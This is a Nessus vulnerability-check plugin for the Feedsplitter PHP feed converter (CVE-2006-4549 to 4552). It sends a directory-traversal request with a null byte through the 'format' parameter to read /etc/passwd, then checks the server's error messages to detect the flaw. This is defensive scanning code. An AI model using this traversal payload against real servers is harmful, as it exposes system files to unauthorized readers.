#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22295);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4549", "CVE-2006-4550", "CVE-2006-4551", "CVE-2006-4552");
  script_bugtraq_id(19779);

  script_name(english:"Feedsplitter <= 2006-01-21 Multiple Vulnerabilities");
  script_summary(english:"Tries to read an invalid XML file with Feedsplitter");

  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running Feedsplitter, a PHP script for converting
RSS / RDF feeds into HTML. 

The version of Feedsplitter installed on the remote host fails to
properly validate the 'format' parameter of the 'feedsplitter.php'
script before using it to parse an arbitrary XML file.  An
unauthenticated attacker may be able to exploit this to discover the
contents of XML files or potentially even execute arbitrary PHP code. 

In addition, the application can optionally disclose the source of
feeds and may allow for arbitrary PHP code execution through the use
of a malicious feed. 

See also :

http://www.securityfocus.com/archive/1/444805/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/feedsplitter", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/feedsplitter.php?",
      "format=", file, "%00&",
      "debug=1"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an error about opening the file or...
    string("unable to parse context file ", file) >< res ||
    # magic_quotes_gpc was enabled or...
    string("file_get_contents(", file, "\\0.xml): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("file_get_contents(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    security_warning(port);
    exit(0);
  }
}
